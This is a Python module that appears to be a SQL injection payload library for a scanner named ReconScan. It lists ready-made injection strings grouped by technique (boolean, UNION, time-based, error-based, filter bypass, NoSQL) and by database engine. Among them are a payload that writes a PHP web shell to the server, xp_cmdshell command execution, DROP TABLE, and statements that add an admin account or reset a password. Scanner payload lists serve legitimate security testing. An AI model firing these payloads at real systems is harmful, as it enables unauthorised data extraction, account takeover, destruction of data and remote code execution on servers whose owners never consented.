"""
ReconScan SQL Injection Payload Library

Comprehensive SQL injection testing payloads from exploit databases.
Organized by database type and injection technique.
"""

class SQLInjectionPayloads:
    """Comprehensive SQL injection payload collection for vulnerability testing."""
    
    def __init__(self):
        """Initialize SQL injection payload sets."""
        
        # Basic SQL injection payloads
        self.basic_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "' OR 1=1#",
            "\" OR 1=1#",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "admin'--",
            "admin\"--",
            "admin'#",
            "admin\"#"
        ]
        
        # Union-based SQL injection payloads
        self.union_payloads = [
            "' UNION SELECT 1,2,3--",
            "\" UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "\" UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "\" UNION ALL SELECT 1,2,3--",
            "1' UNION SELECT user(),version(),database()--",
            "1\" UNION SELECT user(),version(),database()--",
            "' UNION SELECT @@version,@@user,@@database--",
            "\" UNION SELECT @@version,@@user,@@database--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "\" UNION SELECT table_name FROM information_schema.tables--"
        ]
        
        # Time-based blind SQL injection payloads
        self.time_based_payloads = [
            "'; WAITFOR DELAY '00:00:05'--",
            "\"; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "\"; SELECT SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; IF(1=1) WAITFOR DELAY '00:00:05'--",
            "\"; IF(1=1) WAITFOR DELAY '00:00:05'--",
            "' OR IF(1=1,SLEEP(5),0)--",
            "\" OR IF(1=1,SLEEP(5),0)--",
            "'; DECLARE @x CHAR(9);SET @x=';WAITFOR DELAY ''00:00:05''';EXEC(@x)--",
            "1'; WAITFOR DELAY '00:00:05'--"
        ]
        
        # Boolean-based blind SQL injection payloads
        self.boolean_based_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "\" AND 1=1--",
            "\" AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "\" AND \"a\"=\"a",
            "\" AND \"a\"=\"b",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            "\" AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "\" AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        ]
        
        # Error-based SQL injection payloads
        self.error_based_payloads = [
            "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
            "\" AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
            "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
            "\" AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "\" AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXP(~(SELECT * FROM (SELECT database())a))--",
            "\" AND EXP(~(SELECT * FROM (SELECT database())a))--"
        ]
        
        # Database-specific payloads
        self.mysql_payloads = [
            "' AND @@version LIKE '5%'--",
            "\" AND @@version LIKE '5%'--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND (SELECT COUNT(*) FROM mysql.user)>0--",
            "' UNION SELECT user(),database(),version()--",
            "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT database())))--",
            "' AND UPDATEXML(0x0a,CONCAT(0x0a,(SELECT database())),0x0a)--"
        ]
        
        self.postgresql_payloads = [
            "' AND version() LIKE 'PostgreSQL%'--",
            "\" AND version() LIKE 'PostgreSQL%'--",
            "'; SELECT pg_sleep(5)--",
            "\"; SELECT pg_sleep(5)--",
            "' UNION SELECT version(),current_database(),current_user--",
            "' AND (SELECT COUNT(*) FROM pg_user)>0--",
            "' AND CAST((SELECT version()) AS int)--",
            "' AND CAST((SELECT current_database()) AS int)--"
        ]
        
        self.mssql_payloads = [
            "' AND @@version LIKE 'Microsoft%'--",
            "\" AND @@version LIKE 'Microsoft%'--",
            "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
            "\"; EXEC xp_cmdshell('ping 127.0.0.1')--",
            "' UNION SELECT @@version,@@servername,DB_NAME()--",
            "' AND (SELECT COUNT(*) FROM sys.databases)>0--",
            "' AND CONVERT(int,(SELECT @@version))--",
            "' AND CAST((SELECT @@version) AS int)--"
        ]
        
        self.oracle_payloads = [
            "' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--",
            "\" AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--",
            "' UNION SELECT banner,null FROM v$version WHERE rownum=1--",
            "' AND (SELECT COUNT(*) FROM all_users)>0--",
            "' AND CTXSYS.DRITHSX.SN(user,(CHR(39)||(SELECT user FROM dual)||CHR(39)))=1--",
            "' AND UTL_INADDR.get_host_name((SELECT user FROM dual))=1--"
        ]
        
        # NoSQL injection payloads (MongoDB, etc.)
        self.nosql_payloads = [
            "'; return true; var x='",
            "\"; return true; var x=\"",
            "' || '1'=='1",
            "\" || \"1\"==\"1",
            "'; return this.a != 'b'; var y='",
            "admin'; return(true); var foo='bar",
            "' && this.password.match(/.*/)//+%00",
            "' && this.passwordzz.match(/./)//+%00",
            "admin'||'1'=='1'//",
            "admin'||'1'=='1'||'a'=='a",
            "1'; return 'a'=='a' && ''=='",
            "1\"; return 'a'=='a' && ''==\""
        ]
        
        # Second-order SQL injection payloads
        self.second_order_payloads = [
            "admin' UNION SELECT 1,2,'<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'--",
            "test'; INSERT INTO users(username,password) VALUES('admin2','password')--",
            "user'; UPDATE users SET password='newpass' WHERE username='admin'--",
            "data'; DROP TABLE temp_table--",
            "input'; CREATE TABLE test_table(id INT)--"
        ]
        
        # Filter bypass payloads
        self.bypass_payloads = [
            "1'/**/OR/**/1=1--",
            "1\"/**/OR/**/1=1--",
            "1'%20OR%201=1--",
            "1\"%20OR%201=1--",
            "1'||'1'='1",
            "1\"||\"1\"=\"1",
            "1'+'OR'+'1'='1",
            "1\"+\"OR\"+\"1\"=\"1",
            "1' OR 1=1%00",
            "1\" OR 1=1%00",
            "1'/*comment*/OR/*comment*/1=1--",
            "1\"%2f%2a%2aOR%2f%2a%2a1=1--",
            "1'oRdEr By 1--",
            "1\"oRdEr By 1--"
        ]
        
    def get_basic_payloads(self):
        """Get basic SQL injection testing payloads."""
        return self.basic_payloads
    
    def get_union_payloads(self):
        """Get union-based SQL injection payloads."""
        return self.union_payloads
    
    def get_time_based_payloads(self):
        """Get time-based blind SQL injection payloads."""
        return self.time_based_payloads
    
    def get_boolean_based_payloads(self):
        """Get boolean-based blind SQL injection payloads."""
        return self.boolean_based_payloads
    
    def get_error_based_payloads(self):
        """Get error-based SQL injection payloads."""
        return self.error_based_payloads
    
    def get_database_specific_payloads(self, database_type='mysql'):
        """Get database-specific payloads."""
        if database_type.lower() == 'mysql':
            return self.mysql_payloads
        elif database_type.lower() == 'postgresql':
            return self.postgresql_payloads
        elif database_type.lower() == 'mssql':
            return self.mssql_payloads
        elif database_type.lower() == 'oracle':
            return self.oracle_payloads
        else:
            return self.mysql_payloads  # Default to MySQL
    
    def get_nosql_payloads(self):
        """Get NoSQL injection payloads."""
        return self.nosql_payloads
    
    def get_second_order_payloads(self):
        """Get second-order SQL injection payloads."""
        return self.second_order_payloads
    
    def get_bypass_payloads(self):
        """Get filter bypass payloads."""
        return self.bypass_payloads
    
    def get_all_payloads(self):
        """Get comprehensive list of all SQL injection payloads."""
        all_payloads = []
        all_payloads.extend(self.basic_payloads)
        all_payloads.extend(self.union_payloads)
        all_payloads.extend(self.time_based_payloads)
        all_payloads.extend(self.boolean_based_payloads)
        all_payloads.extend(self.error_based_payloads)
        all_payloads.extend(self.mysql_payloads)
        all_payloads.extend(self.postgresql_payloads)
        all_payloads.extend(self.mssql_payloads)
        all_payloads.extend(self.oracle_payloads)
        all_payloads.extend(self.nosql_payloads)
        all_payloads.extend(self.second_order_payloads)
        all_payloads.extend(self.bypass_payloads)
        
        return list(set(all_payloads))  # Remove duplicates
    
    def get_targeted_payloads(self, severity='medium', database_type='mysql'):
        """Get payloads based on severity/depth of testing."""
        if severity == 'low':
            return self.basic_payloads[:10]
        elif severity == 'medium':
            payloads = []
            payloads.extend(self.basic_payloads)
            payloads.extend(self.union_payloads[:10])
            payloads.extend(self.time_based_payloads[:5])
            payloads.extend(self.get_database_specific_payloads(database_type)[:5])
            return payloads
        elif severity == 'high':
            return self.get_all_payloads()
        else:
            return self.basic_payloads
    
    @staticmethod
    def get_common_parameters():
        """Get common parameter names for SQL injection testing."""
        return [
            'id', 'user_id', 'username', 'user', 'uid', 'userid', 'login',
            'email', 'password', 'pass', 'pwd', 'search', 'query', 'q',
            'name', 'category', 'cat', 'type', 'sort', 'order', 'orderby',
            'page', 'limit', 'offset', 'start', 'end', 'from', 'to',
            'item_id', 'product_id', 'article_id', 'post_id', 'comment_id',
            'session_id', 'token', 'key', 'value', 'data', 'content'
        ] 